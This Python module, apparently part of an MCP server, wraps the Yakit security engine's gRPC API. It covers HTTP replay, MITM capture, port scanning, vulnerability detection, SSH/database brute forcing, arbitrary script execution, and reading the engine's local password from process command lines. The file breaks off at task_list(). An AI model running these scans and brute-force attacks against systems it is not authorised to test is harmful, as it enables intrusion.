# -*- coding: utf-8 -*-
"""
yakit-mcp: Yakit 引擎 gRPC 驱动 + GUI 联动 + 窗口截图
核心模块: 引擎管理 / HTTPFuzzer 重放 / HTTPFlow 入库
"""
from __future__ import annotations

import base64
import json
import os
import socket
import subprocess
import sys
import time
from pathlib import Path

import grpc

from . import grpc_pb2 as ypb
from . import grpc_pb2_grpc as ygrpc


class _AuthInterceptor(
    grpc.UnaryUnaryClientInterceptor,
    grpc.UnaryStreamClientInterceptor,
    grpc.StreamUnaryClientInterceptor,
    grpc.StreamStreamClientInterceptor,
):
    """gRPC 客户端拦截器: 为所有请求注入 authorization metadata（local-password 模式）"""

    def __init__(self, metadata):
        self._metadata = metadata

    def _with_metadata(self, client_call_details):
        return client_call_details._replace(metadata=self._metadata)

    def intercept_unary_unary(self, continuation, client_call_details, request):
        return continuation(self._with_metadata(client_call_details), request)

    def intercept_unary_stream(self, continuation, client_call_details, request):
        return continuation(self._with_metadata(client_call_details), request)

    def intercept_stream_unary(self, continuation, client_call_details, request_iterator):
        return continuation(self._with_metadata(client_call_details), request_iterator)

    def intercept_stream_stream(self, continuation, client_call_details, request_iterator):
        return continuation(self._with_metadata(client_call_details), request_iterator)

# ---------------------------------------------------------------------------
# 常量
# ---------------------------------------------------------------------------
DEFAULT_PORT = 10053
DEFAULT_HOST = "127.0.0.1"

# Yakit 安装目录探测
def find_yakit_engine() -> str | None:
    """查找 yak 引擎可执行文件"""
    candidates = [
        os.environ.get("YAKIT_ENGINE", ""),
        r"D:\My_apps\Yakit\bins\yak_windows_amd64.exe",
        r"D:\My_apps\Yakit\bins\yak.exe",
        r"C:\Yakit\bins\yak_windows_amd64.exe",
    ]
    for c in candidates:
        if c and Path(c).exists():
            return c
    # 从 yak.zip 解压
    for z in [r"D:\My_apps\Yakit\bins\yak.zip", r"C:\Yakit\bins\yak.zip"]:
        if Path(z).exists():
            import zipfile
            out = Path(os.environ.get("LOCALAPPDATA", Path.home() / "AppData/Local")) / "yakit-mcp" / "engine"
            out.mkdir(parents=True, exist_ok=True)
            exe = out / "bins" / "yak_windows_amd64.exe"
            if not exe.exists():
                try:
                    with zipfile.ZipFile(z) as zf:
                        zf.extractall(out)
                except Exception:
                    pass
            if exe.exists():
                return str(exe)
    return None


def find_yakit_gui() -> str | None:
    """查找 Yakit GUI 可执行文件"""
    candidates = [
        r"D:\My_apps\Yakit\Yakit.exe",
        r"C:\Program Files\Yakit\Yakit.exe",
        os.path.expandvars(r"%LOCALAPPDATA%\Programs\Yakit\Yakit.exe"),
    ]
    for c in candidates:
        if Path(c).exists():
            return c
    return None


class YakEngine:
    """Yakit 引擎管理器: 探测/启动/连接"""

    def __init__(self, host: str = DEFAULT_HOST, port: int = DEFAULT_PORT, auto_start: bool = True):
        self.host = host
        self.port = port
        self.auto_start = auto_start
        self._proc: subprocess.Popen | None = None
        self._channel: grpc.Channel | None = None
        self._stub: ygrpc.YakStub | None = None
        # 关键: 默认用 GUI 的项目目录（与 GUI 同一数据库，避免 database is closed / 数据不同步）
        self._home = os.environ.get("YAKIT_HOME", str(Path(r"D:\My_apps\Yakit\yakit-projects")))
        if not Path(self._home).exists():
            self._home = os.environ.get("YAKIT_HOME", str(Path(os.environ.get("APPDATA", "")) / "Yakit"))

    # -- 端口探测 ----------------------------------------------------------
    @staticmethod
    def _port_open(host: str, port: int, timeout: float = 0.8) -> bool:
        try:
            with socket.create_connection((host, port), timeout=timeout):
                return True
        except OSError:
            return False

    def is_running(self) -> bool:
        return self._port_open(self.host, self.port)

    # -- 启动 --------------------------------------------------------------
    def start(self, timeout: float = 45) -> bool:
        """启动 yak 引擎 gRPC server（若未运行）"""
        if self.is_running():
            return True
        engine = find_yakit_engine()
        if not engine:
            raise RuntimeError("未找到 yak 引擎，请安装 Yakit 或设置 YAKIT_ENGINE 环境变量")
        log = Path(os.environ.get("LOCALAPPDATA", "")) / "yakit-mcp" / "engine.log"
        log.parent.mkdir(parents=True, exist_ok=True)
        logf = open(log, "ab")
        self._proc = subprocess.Popen(
            [engine, "grpc", "--port", str(self.port), "--home", self._home],
            stdout=logf, stderr=logf,
            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS
            if os.name == "nt" else 0,
            close_fds=True,
        )
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self.is_running():
                return True
            time.sleep(1)
        return self.is_running()

    # -- 连接 --------------------------------------------------------------
    def connect(self) -> ygrpc.YakStub:
        if self._stub and self._channel:
            return self._stub
        # 修复: 先探测 GUI 是否在跑 + 探测真实引擎端口（GUI 引擎可能不在 10053）
        if not self.is_running():
            found = self._probe_engine_port()
            if found:
                self.port = found
        if self.auto_start and not self.is_running():
            if not self.start():
                raise RuntimeError(f"引擎启动失败（{self.host}:{self.port}），请检查日志")
        # GUI 引擎 local-password 模式(9011): 从引擎进程命令行提取随机密码
        auth_metadata = None
        if self.port == 9011:
            pwd = self._grab_engine_password()
            if pwd:
                auth_metadata = (("authorization", f"bearer {pwd}"),)
        self._channel = grpc.insecure_channel(
            f"{self.host}:{self.port}",
            options=[
                ("grpc.max_receive_message_length", 200 * 1024 * 1024),
                ("grpc.max_send_message_length", 200 * 1024 * 1024),
            ],
        )
        try:
            grpc.channel_ready_future(self._channel).result(timeout=10)
        except Exception as e:
            raise RuntimeError(f"gRPC 连接失败: {e!r}")
        if auth_metadata:
            self._stub = ygrpc.YakStub(grpc.intercept_channel(self._channel, _AuthInterceptor(auth_metadata)))
        else:
            self._stub = ygrpc.YakStub(self._channel)
        return self._stub

    @staticmethod
    def _extract_password_from_cmd(cmdline: str) -> str | None:
        """从引擎命令行提取 --local-password 后的密码"""
        import re
        m = re.search(r'--local-password\s+(\S+)', cmdline)
        if m:
            pwd = m.group(1).strip().strip('"')
            if pwd and pwd not in ('""', "''"):
                return pwd
        return None

    def _grab_engine_password(self) -> str | None:
        """从 yak 引擎进程命令行抓 local-password（GUI 每次启动生成的随机密码）"""
        try:
            import subprocess
            r = subprocess.run(
                ['powershell', '-NoProfile', '-Command',
                 "Get-CimInstance Win32_Process | Where-Object { $_.Name -like '*yak*' } | ForEach-Object { $_.CommandLine }"],
                capture_output=True, text=True, timeout=15)
            for line in r.stdout.split('\n'):
                if 'grpc' in line and '--local-password' in line:
                    pwd = self._extract_password_from_cmd(line)
                    if pwd:
                        return pwd
        except Exception:
            pass
        return None

    def _probe_engine_port(self) -> int | None:
        """探测可能存在的引擎端口（GUI 引擎实际端口）"""
        candidates = [10053, 9011, 8087, 63333]
        # 额外: 从 yak 进程的监听端口找
        try:
            import subprocess
            out = subprocess.run(['netstat', '-ano'], capture_output=True, text=True, timeout=10).stdout
            yak_pids = set()
            tl = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=10).stdout
            for line in tl.split('\n'):
                if 'yak' in line.lower() and 'yak_windows' in line.lower() or 'yak.exe' in line.lower():
                    parts = line.split()
                    if len(parts) >= 2 and parts[1].isdigit():
                        yak_pids.add(parts[1])
            for line in out.split('\n'):
                if 'LISTENING' in line:
                    parts = line.split()
                    if len(parts) >= 5 and parts[4] in yak_pids:
                        addr = parts[1]
                        port = int(addr.rsplit(':', 1)[-1])
                        if port not in candidates:
                            candidates.append(port)
        except Exception:
            pass
        for p in candidates:
            if self._port_open(self.host, p):
                return p
        return None

    @property
    def stub(self) -> ygrpc.YakStub:
        return self.connect()

    def version(self) -> str:
        try:
            resp = self.stub.Version(ypb.Empty())
            return resp.Version
        except Exception:
            return "unknown"

    def close(self):
        if self._channel:
            self._channel.close()
            self._channel = None
            self._stub = None


# ---------------------------------------------------------------------------
# 重放逻辑
# ---------------------------------------------------------------------------
def parse_http_packet(packet_text: str) -> dict:
    """
    解析原始 HTTP 报文文本（Burp 复制的包 / Yakit 复制的包）
    返回 {request, is_https, host, port, method, path, scheme, headers, body, protocol_hint}
    protocol_hint: "https" | "http" | "unknown"（协议线索）
    """
    text = packet_text.strip()
    if not text:
        raise ValueError("HTTP 报文为空")
    # 支持换行符归一化
    text = text.replace("\r\n", "\n")
    lines = text.split("\n")
    # 请求行: METHOD SP PATH SP HTTP/x.y
    request_line = lines[0].strip()
    parts = request_line.split(" ")
    if len(parts) < 3:
        raise ValueError(f"请求行格式错误: {request_line!r}")
    method, path, version = parts[0], parts[1], parts[2]

    # 解析 headers
    headers = {}
    header_lines = []
    body_start = None
    for i, line in enumerate(lines[1:], start=1):
        if not line.strip():
            body_start = i + 1
            break
        if ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip().lower()] = v.strip()
        header_lines.append(line)

    body = ""
    if body_start is not None:
        body = "\n".join(lines[body_start:])

    # Host 推断
    host_header = headers.get("host", "")
    is_https = headers.get("__yakit_is_https", "") == "true" or path.startswith("https://")
    scheme = "https" if is_https else "http"
    host = host_header
    port = 443 if scheme == "https" else 80
    if ":" in host_header:
        h, _, p = host_header.rpartition(":")
        if p.isdigit():
            host, port = h, int(p)
    # 协议线索（严格: 只有明确线索才判，否则 unknown）
    protocol_hint = "unknown"
    if path.startswith("https://") or headers.get("__yakit_is_https") == "true":
        protocol_hint = "https"
    elif path.startswith("http://"):
        protocol_hint = "http"
    elif host_header.endswith(":443"):
        protocol_hint = "https"
    elif host_header.endswith(":80"):
        protocol_hint = "http"
    return {
        "request": text,
        "is_https": is_https,
        "host": host,
        "port": port,
        "method": method,
        "path": path,
        "scheme": scheme,
        "headers": headers,
        "body": body,
        "protocol_hint": protocol_hint,
    }


def detect_protocol(packet_text: str) -> str:
    """自动识别协议: 'http' | 'https' | 'unknown'"""
    try:
        return parse_http_packet(packet_text)["protocol_hint"]
    except Exception:
        return "unknown"


def push_webfuzzer_tab(engine: YakEngine, packet: str, is_https: bool = False, tab_name: str = "MCP") -> dict:
    """
    【官方通道】通过 gRPC DuplexConnection 推送 web_fuzzer_tab 事件，
    让 GUI 自动新建 Web Fuzzer tab 并填入请求（源码确认: MCP/后端通知前端新建 Web Fuzzer Tab）。
    彻底绕开 Monaco 编辑器填包（解决旧内容残留 + 填包问题）。
    Config 结构对齐源码 MultipleNodeInfo（含 id/verbose/groupId/pageParams.request），
    openFlag=true 时前端 setCurrentTabKey 切到新 tab 前台显示。
    返回: {ok, sent, reason}
    """
    stub = engine.connect()
    try:
        import time as _time
        # 构造 Config: 对齐 MultipleNodeInfo / ComponentParams 结构（源码 MainOperatorContentType.d.ts）
        config = {
            "id": f"mcp-{int(_time.time() * 1000)}",
            "verbose": tab_name,
            "groupId": "0",
            "sortFieId": 1,
            "pageParams": {
                "id": f"mcp-{int(_time.time() * 1000)}",
                "groupId": "0",
                "isHttps": is_https,
                "request": packet,
                "advancedConfigValue": {},
            },
        }
        payload = {
            "openFlag": True,
            "data": [
                {
                    "PageId": "",
                    "Type": "page",
                    "Config": json.dumps(config, ensure_ascii=False)
                }
            ],
        }
        req = ypb.DuplexConnectionRequest(
            Data=json.dumps(payload, ensure_ascii=False).encode('utf-8'),
            MessageType="web_fuzzer_tab",
            Timestamp=int(time.time() * 1000),
        )
        # 双向流: 发一条就够（服务端收到即推送前端）
        responses = []
        def gen():
            yield req
        for resp in stub.DuplexConnection(gen(), timeout=10):
            responses.append(resp)
            break
        return {"ok": True, "sent": True, "payload": payload}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def replay_packet(
    engine: YakEngine,
    packet_text: str,
    *,
    is_https: bool | None = None,
    proxy: str = "",
    timeout: float = 30.0,
    no_follow_redirect: bool = False,
    max_retries: int = 0,
    return_raw: bool = False,
) -> dict:
    """
    用 Yakit 引擎重放一个 HTTP 包（Web Fuzzer 引擎）
    返回结构化结果；return_raw=True 时附加 "raw_response" 字段（FuzzerResponse 对象）
    """
    info = parse_http_packet(packet_text)
    req = ypb.FuzzerRequest()
    req.Request = info["request"]
    req.IsHTTPS = is_https if is_https is not None else info["is_https"]
    req.NoSystemProxy = True
    req.PerRequestTimeoutSeconds = timeout
    if proxy:
        req.Proxy = proxy
    if no_follow_redirect:
        req.NoFollowRedirect = True
    if max_retries > 0:
        req.MaxRetryTimes = max_retries

    stub = engine.connect()
    results = []
    for resp in stub.HTTPFuzzer(req, timeout=timeout + 30):
        results.append(resp)
    if not results:
        return {"ok": False, "reason": "无响应流返回"}

    resp = results[0]
    response_raw = resp.ResponseRaw if resp.ResponseRaw else b""
    try:
        response_text = response_raw.decode("utf-8", errors="replace")
    except Exception:
        response_text = str(response_raw)

    result = {
        "ok": resp.Ok,
        "reason": resp.Reason,
        "status_code": resp.StatusCode,
        "method": resp.Method,
        "host": resp.Host,
        "url": resp.Url,
        "remote_addr": resp.RemoteAddr,
        "content_type": resp.ContentType,
        "body_length": resp.BodyLength,
        "duration_ms": resp.DurationMs,
        "total_duration_ms": resp.TotalDurationMs,
        "task_id": resp.TaskId,
        "is_https": resp.IsHTTPS,
        "timestamp": resp.Timestamp,
        "uuid": resp.UUID,
        "proxy": resp.Proxy,
        "request_raw": (resp.RequestRaw or b"").decode("utf-8", errors="replace"),
        "response_raw": response_text,
        "response_headers": [
            {"key": h.Header, "value": h.Value} for h in (resp.Headers or [])
        ],
        "matched_by_filter": resp.MatchedByFilter,
        "matched_by_matcher": resp.MatchedByMatcher,
        "hit_color": resp.HitColor,
    }
    if return_raw:
        result["raw_response"] = resp
    return result


def convert_to_httpflow(engine: YakEngine, fuzzer_response: ypb.FuzzerResponse) -> dict:
    """把 Fuzzer 响应转成 HTTPFlow 入库（GUI 流量列表可见）"""
    stub = engine.connect()
    try:
        flow = stub.ConvertFuzzerResponseToHTTPFlow(fuzzer_response)
        return {
            "ok": True,
            "id": flow.Id,
            "url": flow.Url,
            "method": flow.Method,
            "status_code": flow.StatusCode,
            "hash": flow.Hash,
            "created_at": flow.CreatedAt,
        }
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def query_http_flows(engine: YakEngine, keyword: str = "", limit: int = 20) -> dict:
    """查询历史 HTTP 流量（keyword 匹配 URL，引擎层 Keyword+IncludeInUrl 双通道）"""
    stub = engine.connect()
    req = ypb.QueryHTTPFlowRequest()
    req.Keyword = keyword
    if keyword:
        req.IncludeInUrl.append(keyword)
    req.Pagination.Limit = limit
    req.Pagination.Page = 1
    try:
        resp = stub.QueryHTTPFlows(req)
        flows = []
        for f in resp.Data or []:
            flows.append({
                "id": f.Id,
                "method": f.Method,
                "url": f.Url,
                "status_code": f.StatusCode,
                "content_type": f.ContentType,
                "body_length": f.BodyLength,
                "is_https": f.IsHTTPS,
                "created_at": f.CreatedAt,
                "hash": f.Hash,
            })
        return {"ok": True, "total": resp.Total, "flows": flows}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def clear_fuzzer_history(engine: YakEngine, task_id: int = 0, clear_configs: bool = True) -> dict:
    """
    清空 Web Fuzzer 历史（数据库层，解决"旧内容残留"）。
    1. 删除历史任务（web_fuzzer_tasks → UI 历史 tab 列表消失）
    2. 可选: 清空 fuzzer 配置归档（web_fuzzer_configs）
    task_id=0 时删除全部任务；指定 id 只删该任务。
    """
    stub = engine.connect()
    result = {}
    try:
        req = ypb.DeleteHistoryHTTPFuzzerTaskRequest(Id=task_id)
        stub.DeleteHistoryHTTPFuzzerTask(req)
        resp = stub.QueryHistoryHTTPFuzzerTask(ypb.Empty())
        result["remaining_tasks"] = len(list(resp.Tasks if resp.Tasks else []))
        result["tasks_ok"] = True
    except Exception as e:
        result["tasks_ok"] = False
        result["tasks_reason"] = repr(e)

    if clear_configs:
        try:
            r = stub.DeleteFuzzerConfig(ypb.DeleteFuzzerConfigRequest(DeleteAll=True))
            result["configs_ok"] = True
            result["configs_deleted"] = r.EffectRows
        except Exception as e:
            result["configs_ok"] = False
            result["configs_reason"] = repr(e)

    result["ok"] = result.get("tasks_ok", False) or result.get("configs_ok", False)
    result["deleted_all"] = task_id == 0
    return result


def list_fuzzer_history(engine: YakEngine) -> dict:
    """列出 Web Fuzzer 历史任务（tab 数据源）"""
    stub = engine.connect()
    try:
        resp = stub.QueryHistoryHTTPFuzzerTask(ypb.Empty())
        tasks = []
        for t in resp.Tasks or []:
            tasks.append({
                "id": t.Id,
                "host": t.Host,
                "port": t.Port,
                "http_flow_total": t.HTTPFlowTotal,
                "success": t.HTTPFlowSuccessCount,
                "failed": t.HTTPFlowFailedCount,
                "created_at": t.CreatedAt,
            })
        return {"ok": True, "total": len(tasks), "tasks": tasks}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def list_fuzzer_labels(engine: YakEngine) -> dict:
    """列出 Web Fuzzer 分组标签（FuzzerLabel）"""
    stub = engine.connect()
    try:
        resp = stub.QueryFuzzerLabel(ypb.Empty())
        labels = []
        for l in resp.Data or []:
            labels.append({
                "id": l.Id,
                "label": l.Label,
                "description": l.Description,
                "hash": l.Hash,
            })
        return {"ok": True, "total": len(labels), "labels": labels}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def save_fuzzer_label(engine: YakEngine, label: str, description: str = "") -> dict:
    """新建 Web Fuzzer 分组标签"""
    stub = engine.connect()
    try:
        stub.SaveFuzzerLabel(ypb.SaveFuzzerLabelRequest(Data=[
            ypb.FuzzerLabel(Label=label, Description=description)
        ]))
        return {"ok": True, "label": label, "description": description}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def delete_fuzzer_label(engine: YakEngine, hash_value: str) -> dict:
    """删除 Web Fuzzer 分组标签（按 hash）"""
    stub = engine.connect()
    try:
        stub.DeleteFuzzerLabel(ypb.DeleteFuzzerLabelRequest(Hash=hash_value))
        return {"ok": True, "hash": hash_value}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


# ---------------------------------------------------------------------------
# MITM 中间人抓包
# ---------------------------------------------------------------------------
# MITM 流管理（全局单例，避免多流冲突）
_mitm_streams: dict = {}


def mitm_start(engine: YakEngine, port: int = 8083, host: str = "0.0.0.0",
               filters: dict | None = None, timeout: float = 5.0) -> dict:
    """
    启动 MITM 中间人抓包监听（MITMV2 双向流）。
    抓到的流量写入 http_flows 表（SourceType=mitm），用 yakit_mitm_flows 增量获取。
    返回: {ok, port, reason}
    """
    global _mitm_streams
    stub = engine.connect()
    try:
        req = ypb.MITMV2Request()
        req.Host = host
        req.Port = port
        # 过滤器
        if filters:
            fd = ypb.MITMFilterData()
            for k, v in filters.items():
                if k == "include_hostname" and v:
                    fd.IncludeHostname.extend(v if isinstance(v, list) else [v])
                elif k == "exclude_hostname" and v:
                    fd.ExcludeHostname.extend(v if isinstance(v, list) else [v])
                elif k == "exclude_suffix" and v:
                    fd.ExcludeSuffix.extend(v if isinstance(v, list) else [v])
                elif k == "exclude_content_types" and v:
                    fd.ExcludeContentTypes.extend(v if isinstance(v, list) else [v])
            req.FilterData.CopyFrom(fd)
            req.UpdateFilter = True

        def gen():
            yield req
            # 保持流打开（引擎会持续推送流量事件）
            import time as _t
            while True:
                _t.sleep(60)

        # 后台线程启动流（避免阻塞 MCP 调用）
        import threading
        result_box = {}

        def _run():
            try:
                stream = stub.MITMV2(gen(), timeout=timeout)
                first = next(stream, None)
                result_box["stream"] = stream
                result_box["first"] = first
            except Exception as e:
                result_box["error"] = repr(e)

        t = threading.Thread(target=_run, daemon=True)
        t.start()
        t.join(timeout=timeout)
        if "error" in result_box:
            return {"ok": False, "reason": result_box["error"]}
        stream = result_box.get("stream")
        if stream is None:
            return {"ok": False, "reason": "MITM 启动超时（可能端口被占用或引擎不支持）"}
        # 保存流引用（保持连接）
        _mitm_streams[port] = stream
        return {"ok": True, "port": port, "host": host, "started": True}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def mitm_stop(engine: YakEngine, port: int = 8083) -> dict:
    """停止 MITM 监听（关闭流）"""
    global _mitm_streams
    try:
        stream = _mitm_streams.pop(port, None)
        if stream:
            try:
                stream.cancel()
            except Exception:
                pass
        return {"ok": True, "port": port, "stopped": True}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def mitm_status(engine: YakEngine) -> dict:
    """查看当前 MITM 监听状态"""
    global _mitm_streams
    return {"ok": True, "active_ports": list(_mitm_streams.keys())}


def query_mitm_flows(engine: YakEngine, after_id: int = 0, limit: int = 50,
                     keyword: str = "") -> dict:
    """
    增量获取 MITM 抓到的 HTTP 流量（SourceType=mitm）。
    after_id: 只返回 id 大于该值的流量（增量拉取，默认 0=全部）
    """
    stub = engine.connect()
    try:
        req = ypb.QueryHTTPFlowRequest()
        req.SourceType = "mitm"
        req.Pagination.Limit = limit
        req.Pagination.Page = 1
        if after_id > 0:
            req.AfterId = after_id
        if keyword:
            req.Keyword = keyword
        resp = stub.QueryHTTPFlows(req)
        flows = []
        for f in resp.Data or []:
            flows.append({
                "id": f.Id,
                "method": f.Method,
                "url": f.Url,
                "status_code": f.StatusCode,
                "is_https": f.IsHTTPS,
                "content_type": f.ContentType,
                "body_length": f.BodyLength,
                "created_at": f.CreatedAt,
                "source_type": f.SourceType,
                "request": (f.Request or b"").decode("utf-8", errors="replace")[:2000],
                "response": (f.Response or b"").decode("utf-8", errors="replace")[:2000],
            })
        return {"ok": True, "total": resp.Total, "flows": flows}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


# ---------------------------------------------------------------------------
# 主动扫描: 端口扫描 / 漏洞检测 / 弱口令爆破 / 爬虫
# ---------------------------------------------------------------------------
# 扫描结果摘要层: 把原始 JSON 流解析为结构化可用信息
# ---------------------------------------------------------------------------
def summarize_scan_events(raw_lines: list) -> dict:
    """
    解析 Yakit 扫描原始流（每行一个 JSON），提取:
      - ports: 发现的开放端口（host:port/service）
      - risks: 发现的漏洞/风险
      - progress: 进度事件
      - status_cards: 状态卡（如"单个IP扫描端口数"）
      - logs: 关键日志（错误等）
    """
    ports, risks, progress, status_cards, errors = [], [], [], [], []
    for line in raw_lines:
        line = str(line).strip()
        if not line:
            continue
        try:
            obj = json.loads(line)
        except Exception:
            continue
        ctype = obj.get("type", "")
        content = obj.get("content", {})
        if not isinstance(content, dict):
            continue
        data = content.get("data", "")
        if ctype == "progress":
            progress.append(content)
            continue
        # feature-status-card-data: 状态卡（JSON 字符串）
        if ctype == "log" and content.get("level") == "feature-status-card-data":
            try:
                inner = json.loads(data)
                status_cards.append(inner)
            except Exception:
                pass
            continue
        # 尝试解析 data 里的 JSON（漏洞/端口发现通常在这里）
        try:
            inner = json.loads(data) if isinstance(data, str) else data
        except Exception:
            inner = None
        if isinstance(inner, dict):
            # 端口发现: {"host":..., "port":..., "service":...}
            if inner.get("port") is not None and inner.get("host"):
                ports.append({
                    "host": inner.get("host"),
                    "port": inner.get("port"),
                    "proto": inner.get("proto", ""),
                    "service": inner.get("service", inner.get("service_type", "")),
                })
            # 漏洞/风险: {"risk_type"..., "title"...} 或 {"vuln"...}
            elif inner.get("risk_type") or inner.get("title") or inner.get("vuln"):
                risks.append({
                    "title": inner.get("title", ""),
                    "risk_type": inner.get("risk_type", ""),
                    "severity": inner.get("severity", ""),
                    "target": inner.get("host", inner.get("target", "")),
                    "detail": str(inner)[:200],
                })
        # 错误日志
        if content.get("level") in ("error", "fatal"):
            errors.append(str(data)[:300])
    return {
        "ports_found": ports[:50],
        "risks_found": risks[:50],
        "progress_events": len(progress),
        "status_cards": status_cards[:20],
        "errors": errors[:10],
        "total_events": len(raw_lines),
    }


def port_scan(engine: YakEngine, targets: str, ports: str = "80,443,8080",
              mode: str = "tcp", concurrent: int = 100, fingerprint_mode: str = "all") -> dict:
    """
    端口扫描（PortScan）。
    参数: targets(如 1.1.1.1 或 1.1.1.0/24), ports(如 80,443,1-1000), mode(tcp/syn), fingerprint_mode(all/service/web)
    返回: 扫描结果流（发现的端口/服务/指纹）
    """
    stub = engine.connect()
    try:
        req = ypb.PortScanRequest()
        req.Targets = targets
        req.Ports = ports
        req.Mode = mode
        req.Concurrent = concurrent
        req.FingerprintMode = fingerprint_mode
        req.SaveToDB = True
        results = []
        for resp in stub.PortScan(req, timeout=300):
            text = resp.Message or resp.Raw or b""
            if text:
                results.append(text.decode("utf-8", errors="replace") if isinstance(text, bytes) else text)
        # 解析 JSON 流（Yakit 扫描结果: {"type":"log"/"progress", "content":{...}}）
        parsed = []
        for line in results:
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
                ctype = obj.get("type", "")
                content = obj.get("content", {})
                if isinstance(content, dict):
                    level = content.get("level", "")
                    data = content.get("data", "")
                    # 提取有用信息（跳过纯状态卡）
                    if data and "feature-status" not in level and ctype != "progress":
                        try:
                            inner = json.loads(data)
                            parsed.append({"type": ctype, "level": level, "data": inner})
                        except Exception:
                            parsed.append({"type": ctype, "level": level, "data": data[:300]})
            except Exception:
                if "feature-status" not in line:
                    parsed.append({"raw": line[:300]})
        summary = summarize_scan_events(results)
        return {"ok": True, "targets": targets, "ports": ports,
                "total_events": len(results), "parsed": parsed[:60],
                "summary": summary}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def simple_detect(engine: YakEngine, targets: str, ports: str = "80,443",
                  concurrent: int = 100, total_timeout: int = 600) -> dict:
    """
    漏洞检测（SimpleDetect，基于 nuclei 引擎 + Yakit 插件）。
    参数: targets(目标), ports(端口), concurrent(并发), total_timeout(总超时秒)
    返回: 检测结果流（发现的漏洞/指纹）
    """
    stub = engine.connect()
    try:
        # SimpleDetect 基于 PortScan + 漏洞插件
        scan = ypb.PortScanRequest()
        scan.Targets = targets
        scan.Ports = ports
        scan.Mode = "tcp"
        scan.Concurrent = concurrent
        scan.SaveToDB = True
        record = ypb.RecordPortScanRequest()
        record.PortScanRequest.CopyFrom(scan)
        results = []
        for resp in stub.SimpleDetect(record, timeout=total_timeout + 30):
            text = resp.Message or resp.Raw or b""
            if isinstance(text, bytes):
                text = text.decode("utf-8", errors="replace")
            if text:
                results.append(text)
        summary = summarize_scan_events(results)
        return {"ok": True, "targets": targets, "results": results[:200], "summary": summary}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def start_brute(engine: YakEngine, targets: str, service_type: str = "ssh",
                username: str = "", password: str = "",
                username_file: str = "", password_file: str = "",
                concurrent: int = 20) -> dict:
    """
    弱口令爆破（StartBrute）。
    参数:
      targets: 目标(host:port)
      service_type: 服务类型(ssh/mysql/redis/... 用 yakit_brute_types 查)
      username/password: 单账号密码
      username_file/password_file: 字典文件路径
    """
    stub = engine.connect()
    try:
        req = ypb.StartBruteParams()
        req.Targets = targets
        req.Type = service_type
        req.Concurrent = concurrent
        if username:
            req.Usernames.append(username)
        if password:
            req.Passwords.append(password)
        if username_file:
            req.UsernameFile = username_file
        if password_file:
            req.PasswordFile = password_file
        results = []
        for resp in stub.StartBrute(req, timeout=300):
            text = resp.Message or resp.Raw or b""
            if isinstance(text, bytes):
                text = text.decode("utf-8", errors="replace")
            if text:
                results.append(text)
        summary = summarize_scan_events(results)
        return {"ok": True, "target": targets, "type": service_type, "results": results[:100], "summary": summary}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def brute_types(engine: YakEngine) -> dict:
    """获取可用的爆破服务类型"""
    stub = engine.connect()
    try:
        resp = stub.GetAvailableBruteTypes(ypb.Empty())
        return {"ok": True, "types": list(resp.Types or [])}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def exec_yak_code(engine: YakEngine, code: str, params: str = "",
                  work_dir: str = "", timeout: float = 60) -> dict:
    """
    通用 Yak 脚本执行（等价 Yakit 的 Yak Runner）。
    code: Yak 代码字符串（如 `dump(1+1)`、`rsp, req = poc.HTTP(`...`)`）
    params: 参数 JSON（可选）
    返回: 执行输出（stdout/日志流）
    """
    stub = engine.connect()
    try:
        req = ypb.ExecRequest()
        req.Script = code
        if params:
            try:
                p = json.loads(params)
                for k, v in p.items():
                    item = ypb.ExecParamItem()
                    item.Key = k
                    item.Value = str(v)
                    req.Params.append(item)
            except Exception:
                pass
        if work_dir:
            req.WorkDir = work_dir
        results = []
        for resp in stub.Exec(req, timeout=timeout + 30):
            text = resp.Message or resp.Raw or b""
            if isinstance(text, bytes):
                text = text.decode("utf-8", errors="replace")
            if text:
                results.append(text[:2000])
        return {"ok": True, "results": results[:100]}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


# ---------------------------------------------------------------------------
# 长任务异步化: 启动后台扫描任务 + 状态查询
# ---------------------------------------------------------------------------
def scan_async(engine: YakEngine, task_type: str, targets: str,
               ports: str = "80,443", service_type: str = "ssh",
               username: str = "", password: str = "",
               concurrent: int = 100, fingerprint_mode: str = "all") -> dict:
    """
    启动后台扫描任务（不阻塞调用，立即返回 task_id）。
    task_type: port_scan / simple_detect / brute
    用 yakit_task_status / yakit_task_wait 查询结果。
    """
    from .tasks import start_stream_task

    stub = engine.connect()
    if task_type == "port_scan":
        req = ypb.PortScanRequest()
        req.Targets = targets
        req.Ports = ports
        req.Mode = "tcp"
        req.Concurrent = concurrent
        req.FingerprintMode = fingerprint_mode
        req.SaveToDB = True
        tid = start_stream_task(f"port_scan {targets}", lambda: stub.PortScan(req, timeout=600))
    elif task_type == "simple_detect":
        scan = ypb.PortScanRequest()
        scan.Targets = targets
        scan.Ports = ports
        scan.Mode = "tcp"
        scan.Concurrent = concurrent
        scan.SaveToDB = True
        record = ypb.RecordPortScanRequest()
        record.PortScanRequest.CopyFrom(scan)
        tid = start_stream_task(f"simple_detect {targets}", lambda: stub.SimpleDetect(record, timeout=900))
    elif task_type == "brute":
        req = ypb.StartBruteParams()
        req.Targets = targets
        req.Type = service_type
        req.Concurrent = concurrent
        if username:
            req.Usernames.append(username)
        if password:
            req.Passwords.append(password)
        tid = start_stream_task(f"brute {targets} ({service_type})", lambda: stub.StartBrute(req, timeout=900))
    else:
        return {"ok": False, "reason": f"未知任务类型: {task_type}（支持 port_scan/simple_detect/brute）"}

    return {"ok": True, "task_id": tid, "task_type": task_type, "hint": "用 yakit_task_status(task_id) 查询进度"}


def task_list() -> dict:
